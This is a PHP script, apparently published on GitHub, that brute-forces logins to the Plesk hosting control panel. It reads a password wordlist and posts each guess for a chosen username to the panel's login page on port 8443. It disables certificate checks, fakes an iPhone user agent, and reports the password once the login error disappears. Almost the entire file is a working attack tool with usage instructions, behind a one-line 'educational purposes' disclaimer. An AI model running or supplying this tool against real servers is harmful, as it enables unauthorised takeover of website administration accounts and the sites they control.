<?php
/*
-----------------------------------------------------------------------------------
*Another Plesk Panel Brute Forcer 
*Release date 20/02/2020.
*Requiere php-curl, php7 supported.
*Rewrited By Kamal Majaiti | https://majaiti.es 
-----------------------------------------------------------------------------------
*Tested for -> plesk Onyx 17.8.11
*If you want to use another version of plesk ,please open issue on github or make you own change request.
*Usage -> php plesk-brute.php site.com username wordlist
*Dont Forget only domain name example webpanel.site.com
*Example -> php plesk-brute.php example.org admin wordlist.txt
*Provided only for educational or information purposes.
-----------------------------------------------------------------------------------
*/
set_time_limit(0);
function POST($url,$postfields)
{
  $curl = curl_init();
  curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
  curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1);
  curl_setopt($curl,CURLOPT_SSL_VERIFYPEER,0);
  curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($curl,CURLOPT_POST,1);
  curl_setopt($curl,CURLOPT_POSTFIELDS,$postfields);
  curl_setopt($curl,CURLOPT_URL,$url);
  curl_setopt($curl,CURLOPT_USERAGENT,'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1');
  $request = curl_exec($curl);
  if(curl_exec($curl) === false)
  {
  die ('Error Curl : ' . curl_error($curl));
  }
  curl_close($curl);
  return $request;
}

function ReadPWDList($wordlist)
{
  return file($wordlist);
}

function BruteForce($url,$username,$wordlist) {
echo'
-----------------------------------------------------------------------------------
*Another Plesk Panel Brute Forcer 
*Release date 20/02/2020.
*Requiere php-curl, php7x.
*Rewrited By Kamal Majaiti | https://majaiti.es 
-----------------------------------------------------------------------------------
*Tested for -> plesk Onyx 17.8.11
*If you want to use another version of plesk ,please open issue on github or make you own change request.
*Usage -> php plesk-brute.php site.com username wordlist
*Dont Forget.Without http or https format in site.com
*Example -> php plesk-brute.php example.org admin wordlist.txt
-----------------------------------------------------------------------------------
';
$pwdlist = ReadPWDList($wordlist);

    foreach($pwdlist as $password)
    {
      echo "[+]Testing -> ".trim($password)."\n";
      $postfields = "passwd=".trim($password)."&login_locale=default&login_name=".$username;
      $LoginResult = POST($url,$postfields);
      $PleskErrorMSG = 'msg-box msg-error';
      if(!strpos($LoginResult, $PleskErrorMSG))
      {
        die( "[+]Password Cracked -> ".$password);
      }
    }
  }


if ( count($argv) == 4 && file_exists($argv[3])
 )
{
  BruteForce("https://".$argv[1].":8443/login_up.php3",$argv[2],$argv[3]);
} else {
    die ('
  *Tested for -> plesk Onyx 17.8.11
  *If you want to use another version of plesk ,please open issue on github or make you own change request.
  *Usage -> php plesk-brute.php site.com username wordlist
  *Dont Forget.Without http or https format in site.com
  *Example -> php plesk-brute.php example.org admin wordlist.txt
  ');
}
  
?>